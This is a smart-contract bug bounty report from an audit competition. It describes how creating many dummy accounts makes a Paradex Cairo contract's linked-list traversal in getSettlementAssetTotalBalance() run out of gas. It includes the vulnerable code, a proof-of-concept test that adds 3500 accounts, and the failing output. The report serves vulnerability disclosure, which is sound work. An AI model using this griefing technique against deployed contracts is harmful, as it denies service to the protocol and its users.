# #46570 \[SC-Insight] account list DoS issue

**Submitted on Jun 1st 2025 at 19:34:10 UTC by @gln for** [**IOP | Paradex**](https://immunefi.com/audit-competition/iop-paradex)

* **Report ID:** #46570
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/tradeparadex/audit-competition-may-2025/tree/main/paraclear>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Paradex contract stores all accounts in a linked list.

If the account list is large enough, the code which traverse this list may revert with out of gas error.

## Vulnerability Details

To add new account the following function is called from paraclear/src/account/account.cairo :

```
    fn _add_new_account_if_not_exists(
            ref self: ComponentState<TContractState>, account_address: ContractAddress,
        ) -> bool {
            let current_account_address = self
                .Paraclear_account
                .entry(account_address)
                .account_address
                .read();
            if !current_account_address.is_zero() {
                return true;
            }

            let current_tail = self.Paraclear_account_tail.read();
            let new_account = Account {
                account_address: account_address, prev: current_tail, next: Zero::zero(),
            };

			self.Paraclear_account.write(account_address, new_account);
            self.Paraclear_account_tail.write(account_address);
            if !current_tail.is_zero() {
                let tail_account = self.Paraclear_account.read(current_tail);
                self
                    .Paraclear_account
                    .write(
                        current_tail,
                        Account {
                            account_address: current_tail,
                            prev: tail_account.prev,
                            next: account_address,
                        },
                    );
            }
            true
        }

```

Let's see how the code traverses this list, from paraclear/src/paraclear/paraclear.cairo:

```
      fn getSettlementAssetTotalBalance(self: @ContractState) -> felt252 {
            let settlement_token_asset = self.getSettlementTokenAsset();
            let mut account_tail = self.account.Paraclear_account_tail.read();
            let mut total_balance: felt252 = 0;
            while account_tail != Zero::zero() {
                total_balance += self
                    .token
                    .get_token_asset_balance(account_tail, settlement_token_asset);
                account_tail = self.account.Paraclear_account.read(account_tail).prev;
            }
            total_balance
        }

```

If account list is large enough, the getSettlementAssetTotalBalance() function call will fail due to out of gas error.

This creates a potential Denial of Service issue:

1. Attacker creates huge amount of dummy accounts, they will be stored in a linked list (self.account.Paraclear\_account)
2. A call to getSettlementAssetTotalBalance() will always revert

## Impact Details

Denial of Service issue, call to getSettlementAssetTotalBalance() will always fail with out of gas.

## Proof of Concept

## Proof of Concept

How to reproduce:

1. add the following test to paraclear/src/account/tests/test\_account.cairo

```
#[test]
fn test_add_account_poc() {
    let (_, paraclear_dispatcher) = setup_paraclear();
    let account_dispatcher = IAccountDispatcher {
        contract_address: paraclear_dispatcher.contract_address,
    };

    start_cheat_caller_address(account_dispatcher.contract_address, ADMIN());

    let mut i: u128 = 0;
    while i < 3500 {
        let success = account_dispatcher.add_account(address_from_felt(i.into()));
        assert(success, 'Failed to add account');
        i += 1;
    }
    stop_cheat_caller_address(account_dispatcher.contract_address);
    println!("XXXXKE added {} accounts", i);

    println!("XXXXKE executing getSettlementAssetTotalBalance()..");
    let amount = paraclear_dispatcher.getSettlementAssetTotalBalance();
    println!("XXXXXKE amount {}", amount);
}
```

2. run the test

```
$ snforge test test_add_account_poc
...
Collected 1 test(s) from paradex_paraclear package
Running 1 test(s) from tests/
XXXXKE added 3500 accounts
XXXXKE executing getSettlementAssetTotalBalance()..
[FAIL] paradex_paraclear::account::tests::test_account::test_add_account_poc

Failure data:
    Got an exception while executing a hint: Hint Error: Error at pc=0:77304:
Could not reach the end of the program. RunResources has no remaining steps.
Cairo traceback (most recent call last):
Unknown location (pc=0:47194)
Unknown location (pc=0:47194)
```
